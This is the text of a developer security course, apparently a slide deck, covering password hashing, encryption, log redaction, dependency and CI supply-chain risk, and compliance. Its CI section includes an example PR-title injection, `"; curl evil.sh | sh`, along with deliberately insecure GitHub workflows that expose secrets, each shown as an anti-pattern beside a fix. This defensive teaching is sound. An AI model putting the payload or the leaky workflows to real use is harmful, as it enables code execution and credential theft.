columns.title: An unprotected dump
items: Passwords: 123456 and ryan@2024 can be read directly
SSN and phone numbers all in plain text
Card numbers stored with their CVV
Emails and tokens scattered through the logs
columns.tip: After a theft every loss is direct: passwords open accounts on other sites too, and an SSN (Social Security number) lets someone steal an identity.

columns.title: A protected dump
items: Passwords: argon2id hashes, which can't be reversed
SSN and phone: encrypted, with the key kept elsewhere
Cards: only the payment provider's token
No personal data in the logs
columns.tip: The thief holds only meaningless bytes. To get the real values, they would have to break into a separate safe (the key).

blocks.body: Assume the database will be stolen one day. Store the data so the thief gets nothing.

aside.body: Guarding the entrance (firewall, passwords) is not enough. Backups, wrong permissions, SQL injection or one employee's mistake can send data outside. The data's own protection is the last wall.

items.meaning: Personally Identifiable Information: name, phone, SSN (Social Security number), email, address; anything that can identify a person.
Protection in several layers instead of one, so when one breaks the others still hold.

check.q: The server has a firewall, so why does the data inside the database need protection too?
check.a: Because data leaves around the firewall: backups, SQL injection, an employee's mistake. If the data protects itself, the damage stays limited even after a theft.

slides.title: Passwords: fry them, don't store them
slides.tldr: Hash passwords, don't encrypt them: use a slow, salted algorithm (argon2id/bcrypt) from which the original password can't be recovered.

blocks.title: Frying an egg
blocks.body: Once you've fried an egg, you can't turn it back into a raw one. That's a hash. Afterwards you can still ask "is this fried egg from that egg?" by frying again the same way. Salt is a different spice on every egg: the same password looks different each time, so one prepared lookup table can't match them all. And frying slowly (a slow hash) means every guess costs the thief a lot of time.

blocks.caption: Ways to store a password, and why each is right or wrong

rows.tip: The moment the database leaks, every password is out in the open.
If the key is stolen, all the passwords come back at once. There is no need to get passwords back at all.

cells: No, but guessing is very fast
rows.tip: These were made for file checks, so they are fast. An attacker can make billions of guesses per second: a list of 1 million common passwords is tried in a blink.
Deliberately slow, with a different salt in every hash. At about a quarter of a second per guess, the same 1 million passwords take days on one machine.

blocks.code:
security:
    password_hashers:
        Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface: 'auto'

marks.tip: "auto" means the best available on the server (usually argon2id or bcrypt today). If that changes in future, old hashes upgrade themselves at login.
#[\SensitiveParameter] (PHP 8.2+) hides the password value in stack traces and logs.
UserPasswordHasherInterface generates the salt itself and stores it inside the full string, so no separate column is needed.

blocks.body: Never store a password in plain text or encrypted: use a slow, salted hash.

items: In login checks, the Symfony authenticator does both isPasswordValid and the rehash of old hashes for you; don't compare by hand.
If your password reset has a "send me my old password" feature, that proves passwords can be recovered, which means they are stored wrongly. Send only a reset link.

aside.body: Passwords: hash, salt, slow. Not encryption.

check.q: Why is it wrong to store passwords encrypted with AES?
check.a: Encryption can be reversed with the key. If the key or the server is stolen, every password opens at once. A hash can't be reversed, so the original password is never recovered.

slides.title: Encryption: in transit, on disk, and per field
slides.tldr: TLS for the journey, disk/DB encryption for storage, and app-level sodium encryption for the most sensitive fields. Each of the three stops a different danger.

blocks.title: The courier, the warehouse and the private locker
blocks.body: On the road, the courier's sealed envelope (TLS) can't be opened and read by anyone along the way. The warehouse lock (disk encryption) helps if a thief breaks in and carries the goods away, but the warehouse staff can still open everything. So the most valuable items go in a separate private locker (field encryption), whose key even the warehouse staff don't have.

blocks.caption: Three layers of encryption: what each stops and what it doesn't

cells: Theft of a server or DB
rows.tip: TLS is needed everywhere: browser to server and server to DB, even on the internal network.

cells: Theft of a disk or backup
rows.tip: A running server reads the disk in the clear on its own. If the app is hacked, everything is visible.
Only for sensitive fields (SSN, card-related data), because searching and sorting them gets harder.

marks.tip: The key comes from the environment or the vault, not from the code. The base64: processor produces the binary key. See secrets-management.
A fresh random nonce every time. Reusing a nonce with the same key breaks the encryption.
secretbox is authenticated: if anyone alters the data, open() returns false, so a wrong value is never read silently.

blocks.body: Never invent your own algorithm; use a vetted library like sodium.

items: No page without HTTPS: redirect HTTP to HTTPS on the server and send the HSTS header (Strict-Transport-Security). Use TLS 1.2 or higher.
Use TLS for the DB connection too (on a managed DB it is usually one setting). An internal network is not automatically safe.
You can't run WHERE directly on an encrypted column. To search, you have to keep a separate hash (a blind index), which adds complexity.

items.label: Where to keep the encryption key

check.q: Disk encryption is on, so why can SQL injection still leak SSNs?
check.a: A running database reads the disk in the clear, so queries coming through the app see every value in plain form. Field-level encryption doesn't open without the app's key.

slides.title: Envelope encryption: the key to the keys
slides.tldr: Each piece of data gets its own data key, and those keys are locked with a master key in a KMS. The master key never leaves the KMS.

blocks.title: Bank lockers and the master vault
blocks.body: In a bank, every locker has its own small key. Those small keys are in turn locked in the bank's master vault, which never leaves the bank. To open a locker, you ask the manager: "Please take my key out of the vault." The KMS is that master vault, and a data key is the key to one locker.

blocks.caption: Envelope encryption both ways: lock the data with a data key, then ask the KMS to unlock that key later

nodes.label: Symfony app
nodes.tip: It never knows the master key. It only takes a small data key and encrypts data with it.

nodes.label: KMS
nodes.tip: AWS KMS, Google Cloud KMS or Vault. The master key stays inside and never comes out.

nodes.label: Database
nodes.tip: Holds the encrypted data and, next to it, the locked data key. Neither is readable without the other.

edges.label: The app asks the KMS for a new data key
The KMS returns the data key in two forms: open and locked
The app stores the encrypted data and the locked key
Later, the app reads the encrypted data and the locked key back
It sends only the locked key to the KMS and asks it to open it
The KMS returns the open data key; the app decrypts, then wipes it

marks.tip: generateDataKey of Aws\Kms\KmsClient returns two forms of the same key: Plaintext (to encrypt with) and CiphertextBlob (to store).
Wipe the open key from memory as soon as you are done. Only the locked form is stored.
The KMS checks who is asking against its access policy and opens the locked key. Only the small data key comes back; the master key stays inside.
Wipe the open key right after use, just as when encrypting.
False means the data or the key was tampered with. Never use the result.

blocks.body: The master key never leaves the KMS; the app stores only the locked data key.

aside.body: If one key covers all the data, then once it is stolen everything is lost, and changing it means re-encrypting all the data. With envelopes, rotating the master key only requires locking the small data keys again.

use: Many records or users that each need separate protection
Rules that ask for key rotation and an audit trail of every decrypt
avoid: A small app with one secret: a single key from the secrets vault is simpler, while a KMS adds a network call, a bill and one more thing that can be down

items: You don't have to call the KMS for every read: a data key can be cached in memory for a short time. The price is that the open key lives in memory longer.
In AWS KMS, ReEncrypt re-locks a data key under a new master key without the app ever seeing the open key.
Limit who can decrypt through the KMS with an access policy, and keep an audit log of every decrypt.

items.meaning: Key Management Service: a secure service for creating, storing and using keys.
The DEK encrypts the data; the KEK (the master key) locks the DEK.

check.q: Why does rotating the master key in envelope encryption not mean re-encrypting the whole database?
check.a: Because the data is encrypted with data keys. When the master key changes, you only lock the small data keys again with the new master key.

slides.title: How a password ends up in the logs
slides.tldr: One "log everything" debug line copies passwords and SSNs into files that live for months and that many people can read. Log the event, not the form.

blocks.body: A customer can't log in, so a developer adds one debug line that logs the whole form. The line stays. Logs are kept for 90 days and shipped to a search tool that 40 people can open. Now anyone who searches "Login failed" sees customers' passwords and SSNs in plain text, and a stolen log backup is as bad as a stolen database.

marks.tip: This copies every form field into the log, password included. The developer only wanted to know why the login failed.
Plain text, for 90 days, searchable by everyone with log access. Anyone reading it can log in as Ryan.
Log the event, not the form: where it came from, why it failed, and an id to find the rest of the story in other logs.

items: Never log whole request bodies, the Authorization and Cookie headers, or exception objects that carry them.
Logs are data too: give them a retention period (for example 30 days) and limit who can search them.

items.label: Structured logs and what not to write

check.q: A teammate logs `$request->request->all()` to debug logins. What leaks, and what should be logged instead?
check.a: Passwords and SSNs land in log files kept for months. Log only the event: IP, failure reason and a request id, never the form.

slides.title: Personal data: keep less, show it masked, keep it out of logs
slides.tldr: Don't keep what you can do without. Mask it when showing it, tokenize cards, and make sure logs don't turn into a secret warehouse of personal data.

blocks.title: The locker slip and the hidden number
blocks.body: When you leave your belongings in a bank locker, you get only a slip; even if you lose it, nobody gets your things. A banking app shows a Social Security number as ***-**-6789 on screen: you recognize it at a glance, but you can't make out the real number. The first is tokenization, the second is masking.

blocks.caption: Which technique, and when

cells: When displaying on screen or in logs
rows.tip: For display or logs only. It is not a way of keeping the real value safe.

cells: Yes, but only at the provider
rows.tip: We keep only a token. The real card sits in the payment provider's vault, which lowers our PCI risk.
For information you truly must read back. The key lives in a separate safe.
When you only need to know "does it match?". The original value is no longer needed.

marks.tip: A processor written once works on every log channel, so there is a last fence even when someone makes a mistake.
Only these key names are caught. A key called "passport" or "phone" slips through, so extend the list as new fields appear.
Only the context array is cleaned. Text inside the message ("Login for (555) 010-2233 failed") and the extra array are not touched.
It also walks into arrays nested inside the context. Checking only the top level would leak nested data.

blocks.title: Rules for handling PII
items: Data minimization: don't ask for or store information you can work without.
Retention: decide how long you keep it, and delete it when the time is up.
Know every PII field: where it lives and who can read it.
PII also ends up in logs, error reports and analytics; check those too.
The redactor is a net, not a plan: it matches key names only, so keep PII out of messages and out of keys it doesn't list.

blocks.body: Don't keep what you don't need to keep, and don't let what you do keep reach the logs.

items.label: Structured logs and what not to write

check.q: What is the difference in protection between storing a card number encrypted in our own database and tokenizing it?
check.a: With encryption, the real card stays with us and the risk rests on our key. With tokenization, the real card stays with the provider and we keep only a meaningless token.

slides.title: Tainted flour in the sack: the libraries inside
slides.tldr: Most of your app's code, often 80 to 90 percent, was written by someone else. If any one library is poisoned, it lands in your production on its own.

blocks.title: A sack of flour bought from the supplier
blocks.body: A restaurant cook doesn't grow his own wheat; he buys flour from a supplier and bakes with it. If someone mixes something bad into the supplier's sack, the cook unknowingly serves it to a thousand diners. `composer require` is the same: you buy someone else's code and put it in your app, and the code that code depends on comes along too.

blocks.caption: How one poisoned new version reaches production

nodes.label: Attacker
nodes.tip: Takes over a maintainer's (the library owner's) account through a mistake or a stolen password, or creates a fake package with a look-alike name (typosquatting).

nodes.label: Packagist
nodes.tip: Where everyone's libraries are downloaded from. When a new version appears, it gets installed on trust.

nodes.label: CI / deploy
nodes.tip: If the lock file is ignored, this pulls the newest version, which means the poisoned one.

nodes.label: Production
nodes.tip: The malicious code now runs with your server's permissions and can read your secrets too.

edges.label: Publishes a new version with malicious code mixed in
CI pulls the new version because versions aren't pinned
The app, malicious code included, gets deployed

blocks.body: You are responsible for code you didn't write; a new library means new trust.

aside.title: A small library, a big incident
aside.body: The owner of a popular JavaScript library got tired and handed the project to a stranger. The new owner slipped code into the next version that stole money from crypto wallets. It sat inside the dependencies of countless projects for about two months before anyone noticed.

items.meaning: Something the library you installed depends on: an indirect dependency you never knew about.
Publishing a fake package with a name almost identical to a popular one, and waiting for someone to mistype.

check.q: You installed only 10 packages, so why are there hundreds in vendor/, and why does that raise the risk?
check.a: Each package brings its own dependencies (transitive ones). The more code comes from outside, the more people's mistakes or vulnerabilities can reach your production.

slides.title: Lock files, audits and regular updates
slides.tldr: Commit composer.lock, run `install` (not `update`) in CI, run `composer audit` on every build, and update in small steps.

blocks.title: The flour lot number
blocks.body: A good grocer keeps a lot number on every sack. When contamination is discovered, the store can trace which lot went to whom. `composer.lock` is that lot number: exactly which version, and which commit's code, was taken. Without it, every build brings in different flour nobody has inspected.

blocks.title: Four rules
items: Commit `composer.lock` and `yarn.lock`; what runs in production is exactly what CI tested.
In CI and deploys use `composer install` (it obeys the lock); `composer update` is for developers only, in a PR.
Run `composer audit` and Yarn's audit on every build: if a known vulnerability turns up, the build breaks.
Use Dependabot or Renovate for small updates every week, not one giant update once a year.

blocks.code:
name: ci
on: [pull_request]
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<full-commit-SHA>   # pinned by SHA, not by tag
      - uses: shivammathur/setup-php@<full-commit-SHA>
        with:
          php-version: '8.3'
      - run: composer install --no-interaction --prefer-dist
      - run: composer audit --locked
      - run: yarn install --immutable
      - run: yarn npm audit --severity high

marks.tip: The job's default permission is read-only. Raise it only in the step that needs to write.
A tag (v4) can be moved to point at other code; a commit SHA can't be changed. So pin even the actions inside CI by SHA.
--locked checks the versions in the lock file without resolving anything new. If it finds a vulnerability the exit code is non-zero and the build breaks.
--immutable doesn't let the lock file change: if the versions drift, the build fails.

blocks.body: Install in CI, not update, and audit on every build.

items.desc: lists known vulnerabilities (security advisories)
which of the packages you installed are out of date
who pulled this package in
production install: no dev packages

items: Locking has a price: fixes no longer arrive by themselves. Without Dependabot or Renovate, a locked app can sit on a vulnerable version for years.
An audit only knows vulnerabilities that were already reported. It can't catch a poisoned release published an hour ago.
Before adopting a new library, look at how many maintainers it has, when the last release was, and how many issues sit open. Then ask whether you need it at all.
Read a package name twice: symfony/yaml and symfony-yaml/yaml are not the same.

check.q: What is the danger of running `composer update` in CI, and why is `composer install` better?
check.a: `update` pulls the newest versions at build time, so the code that was tested and the code that gets deployed can differ. `install` fetches exactly the versions in the lock file.

slides.title: The CI pipeline is a key room too
slides.tldr: CI runs code you haven't read and holds your deploy keys. Never let secrets and unreviewed code meet in the same job.

blocks.title: The key to the store's cash box
blocks.body: When a new employee joins a store, nobody gives them the master key to the cash box. They get a key for one day, for their own counter's box only. CI is that employee: it runs every piece of code sent to it, and some of that code is bad. The cash box is safe only while the key and the stranger never share a counter.

blocks.title: Where CI secrets really leak
items: A `pull_request_target` workflow that checks out the PR's code. It runs with your secrets, but the code is a stranger's. (Plain `pull_request` gives fork PRs no secrets.)
A PR from a branch inside your own repo gets secrets, and it can edit the workflow file itself. One stolen teammate account is enough.
A poisoned library or action inside the job. It runs with the same secrets as your own code.

blocks.code:
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: composer install && vendor/bin/phpunit
        env:
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}

marks.tip: pull_request_target runs with your secrets, even when the PR comes from a stranger's fork.
This checks out the stranger's code, not yours.
composer install runs the PR's composer.json scripts and phpunit loads the PR's tests: a stranger's code, with the key in its environment.

blocks.code:
on: pull_request
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<full-commit-SHA>
      - run: composer install --no-interaction
      - run: vendor/bin/phpunit    # no secrets in this job, so nothing to steal

marks.tip: Plain pull_request: for a PR from a fork GitHub withholds the secrets and makes the token read-only.
Even for a branch in your own repo, the job's token can only read.
Tests use fake or sandbox values. The real deploy keys live in a separate workflow (next slide).

blocks.body: Secrets only ever meet code that has been reviewed and merged.

items: Pasting PR text into a shell step: `run: echo "${{ github.event.pull_request.title }}"`. A title like `"; curl evil.sh | sh` runs as a command. Pass it through `env:` instead.
Calling a third-party action by tag (@v1). If the owner moves the tag, different code runs. Pin by commit SHA.
One admin-level token shared across every repository.
The price: tests that need real secrets (a paid API, say) can't run on fork PRs. Give tests fake or sandbox keys, and let a maintainer re-run after reading the code.

check.q: A stranger forks your repo and opens a PR. Which trigger could let their code read your secrets, and why not plain `pull_request`?
check.a: `pull_request_target` (or `workflow_run`) that checks out the PR's code runs with secrets. Plain `pull_request` withholds secrets from fork PRs.

slides.title: Deploy keys that expire: OIDC and protected branches
slides.tldr: Deploy only after a merge to main, and swap the stored cloud key for OIDC: a one-hour credential, limited to one narrow role.

blocks.body:
A stored access key is a house key under the doormat: it works from anywhere, for years. **OIDC** works like a visitor's pass at an office gate. For every run, GitHub signs a short note: "repo shop, branch main, environment production". The cloud checks the note against a rule you wrote (the trust policy) and hands over a key that dies in about an hour.

The price: a one-time setup of that trust rule in your cloud account, and a cloud that supports OIDC. The rule must name your exact repo and environment, or any other repo's workflow could borrow the role.

blocks.code:
on: [push, pull_request]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "key is ${{ secrets.AWS_SECRET_ACCESS_KEY }}"
      - run: ./deploy.sh
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}

marks.tip: The deploy runs on every PR. A PR from a branch in your repo gets the secrets and can edit this very file to print them.
Echoing a secret: there are many ways around masking (such as printing it base64-encoded), and it leaks into the log.
A long-lived access key: if stolen, it keeps working for years.

blocks.code:
on:
  push:
    branches: [main]
permissions:
  id-token: write
  contents: read
jobs:
  deploy:
    environment: production
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<full-commit-SHA>
      - uses: aws-actions/configure-aws-credentials@<full-commit-SHA>
        with:
          role-to-assume: arn:aws:iam::123456789012:role/shop-deploy
          aws-region: ap-southeast-1
      - run: ./deploy.sh

marks.tip: Deploys only on a push to main, after review; code from a PR or a fork never touches the secrets.
id-token: write means OIDC: GitHub issues a temporary proof for each run, and the cloud turns it into a credential good for about an hour.
With environment: production you can require manual approval and keep separate secrets.
The role can only deploy and nothing else (least privilege), and its trust policy accepts only this repo and environment.

blocks.body: The shorter-lived and smaller the key CI holds, the less damage a leak does.

items.meaning: OpenID Connect: proving who you are with a signed note that expires, instead of a stored password.
The rule in your cloud account saying which repo, branch or environment may borrow a role.

items: Protect main: require a reviewed PR before merging, so only vetted code can reach the deploy job.
If your cloud has no OIDC, keep the key as an environment secret with manual approval, and rotate it often.

check.q: A deploy key leaks from a CI log. Why does OIDC leave the thief with much less than a stored access key would?
check.a: The OIDC credential dies in about an hour and works only for one narrow role. A stored key works for years, until someone notices and rotates it.

slides.title: SOC 2, PCI DSS, GDPR, HIPAA: not rules, but design inputs
slides.tldr: Compliance is not paperwork added at the end. Which rules apply depends on the data you touch, and those rules tell you at the start what to build.

blocks.title: A restaurant's hygiene certificate
blocks.body: To earn a food-safety certificate, you have to change the kitchen's design itself: separate boards for raw and cooked food, lids, a place to wash hands. Adding these after the kitchen is built is hard and expensive. Compliance is the same: if you learn the required rules first and design around them, it costs less.

A big customer says: "We'll sign if you show a SOC 2 report." The auditor asks for three months of proof of who viewed which record. You have no such log. Adding one now means touching every controller, and the missing three months can never be recreated.

blocks.caption: Four frameworks: when they apply and what pressure they put on design

cells: B2B customers ask for an audit report
Access reviews, audit logs, change rules
rows.tip: An independent auditor's report on whether you have security controls. Type II needs proof that they actually ran for several months.

cells: Not touching cards, tokenization, isolated network
rows.tip: The easiest route is never to bring cards onto your own server (use the provider's hosted form). That shrinks the scope of the rules.

cells: Personal data of people in the EU
Erasure, export, consent, breach notice within 72 hours
rows.tip: User rights (to see, correct and delete their data) have to be built as features. A data breach must be reported to the authority within 72 hours.
For US healthcare data. You need logs of who viewed which patient's information, and contracts with every third party.

blocks.body: The data you touch decides which rules apply; touch less data and fewer rules apply.

items: Compliant does not mean secure: a certificate means a checklist was met, not that attacks are guaranteed to fail.
Interpreting the law is not an engineer's job. This gives general ideas; settle what applies to your case with your legal or compliance team.

items.meaning: Type I: are the controls in place on one day? Type II: have they run properly for several months?
Protected Health Information: health data that identifies a patient.

check.q: What is the PCI benefit of using the provider's hosted form instead of bringing card data onto your own server?
check.a: Card numbers never enter our systems, so the scope of the PCI rules becomes much smaller. What we don't touch, we are less responsible for.

slides.title: From rules to features: what you add to the design
slides.tldr: Almost all of the four frameworks boil down to a few common features: audit logs, access reviews, encryption, erasure and export, and a runbook for when a breach happens.

blocks.caption: Five common engineering features for meeting the rules

steps.title: 1. Audit log
steps.body: Who did what and when, in a way that can't be altered
steps.tip: SOC 2, HIPAA and GDPR all want it. When something goes wrong, you must be able to say who did it.

steps.title: 2. Access review
steps.body: Every quarter, check who has which rights and trim
steps.tip: Old access held by people who left or changed roles is the biggest gap.

steps.title: 3. Encryption
steps.body: In transit, on disk and in sensitive fields
steps.tip: The rule says "don't store it in plain text". Which layer you need depends on the kind of data.

steps.title: 4. Erasure and export
steps.body: Show a user their data, or delete it, on request
steps.tip: A GDPR right. Legal records like a ledger can't be deleted, so they get anonymized.

steps.title: 5. Breach runbook
steps.body: Who tells whom, and within what time
steps.tip: GDPR gives 72 hours to notify the authority. Thinking it up on the night of the incident is too late, so write it in advance.

marks.tip: We don't delete the row; we delete the identifying data. The foreign keys to orders and money records stay intact.
The erasure itself is recorded too: there must be proof of who asked for whose data to be deleted.
invalid.example is a reserved domain, so the email can never reach anyone.

aside.body: Read the rule, build the feature: logs, access, encryption, erasure, a breach plan.

items: A log that can't be altered: give the app's database user INSERT but no UPDATE or DELETE on the audit table, or ship the log to separate storage.
Anonymizing the users table is not enough. Copies hide in shipping addresses, the search index, analytics and backups; erase or expire those too.

use: When a customer or the law demands compliance: first settle your data types, then pick the rules that apply.
avoid: Trying to meet every framework at once; start with what the riskiest data requires.

check.q: A user says "delete my data", but the money records of their orders must legally be kept. What do you do?
check.a: Don't delete the row; anonymize identifying data like name, email and phone, and keep the money records. Write the erasure itself into the audit log too.
